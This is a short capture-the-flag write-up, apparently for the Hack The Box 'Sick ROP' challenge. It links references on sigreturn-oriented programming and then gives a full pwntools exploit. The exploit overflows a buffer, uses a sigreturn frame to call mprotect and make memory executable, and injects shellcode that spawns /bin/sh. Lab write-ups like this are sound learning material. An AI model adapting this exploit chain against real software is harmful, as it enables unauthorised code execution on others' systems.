---
author: "lilith"
title: "HTB Sick ROP Writeup"
date: "2022-12-16"
description: "ROP chain through Sigreturn - a very different ROP approach that I learned today"
tags:
  - writeup
  - pwn
---

## About SROP 
- [Wikipedia](https://en.wikipedia.org/wiki/Sigreturn-oriented_programming)
- [Nightmare by Guyinatuxedo](https://guyinatuxedo.github.io/16-srop/index.html)
- [Amriunix Blog](https://amriunix.com/post/sigreturn-oriented-programming-srop/)

## Exploit
```py
from pwn import *

context.arch = "amd64"
e = ELF('./sick_rop')
r = process('./sick_rop')

syscall  = 0x401014
vulnFun  = p64(0x40102e)
vulnPtr  = 0x4010d8
virtual  = 0x400000

overflow = b'A'*40
getShell = """
push   0x42
pop    rax
inc    ah
cqo
push   rdx
movabs rdi, 0x68732f2f6e69622f
push   rdi
push   rsp
pop    rsi
mov    r8, rdx
mov    r10, rdx
syscall
"""
shell = asm(getShell)

frame = SigreturnFrame()
frame.rax = 10      # sys_mprotect
frame.rdi = virtual # Virtual Mem Segment
frame.rsi = 0x4000  # Size
frame.rdx = 7       # set rwx perm
frame.rsp = vulnPtr # pointer to vuln func
frame.rip = syscall # syscall addr

payload =  overflow + p64(e.symbols['vuln']) 
payload += p64(syscall) + bytes(frame)
r.sendline(payload)
r.recv()

r.send(b'A'*15)
r.recv()

payload = overflow + p64(vulnPtr+16) + shell
r.sendline(payload)
r.recv()

r.interactive()
```

![](images/sick-rop/shell.png)